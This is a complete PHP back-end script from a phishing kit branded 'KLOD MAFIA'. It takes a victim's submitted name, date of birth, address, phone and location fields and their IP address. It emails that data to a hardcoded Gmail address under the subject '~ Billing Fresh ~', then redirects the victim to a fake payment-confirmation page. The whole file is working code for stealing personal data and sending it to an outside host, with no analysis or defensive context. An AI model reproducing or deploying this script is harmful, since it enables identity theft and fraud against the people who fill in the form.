<?php
$ip = getenv("REMOTE_ADDR");
$message .= "|----------|KLOD MAFIA|--------------|\n";
$message .= "|First Name: ".$_POST['gg1']."\n";
$message .= "|Last  Name: ".$_POST['gg2']."\n";
$message .= "|Date of Birth: ".$_POST['gg3']."\n";
$message .= "|Address   : ".$_POST['gg4']."\n";
$message .= "|City   : ".$_POST['gg6']."\n";
$message .= "|Cuntry      : ".$_POST['gg7']."\n";
$message .= "|state     : ".$_POST['SA']."\n";
$message .= "|zip code  : ".$_POST['ZP']."\n";
$message .= "|phone  : ".$_POST['PH']."\n";
$message .= "|---------------|Info|-------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|HostName : ".$hostname."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "|----------|KLOD MAFIA|--------------|\n";
$send = "islemryahi@gmail.com";
$subject = "~ Billing Fresh ~ | $ip";
{
mail("$send", "$subject", $message);   
}
header("Location:../websc-ConfirmpayStep.php");
?>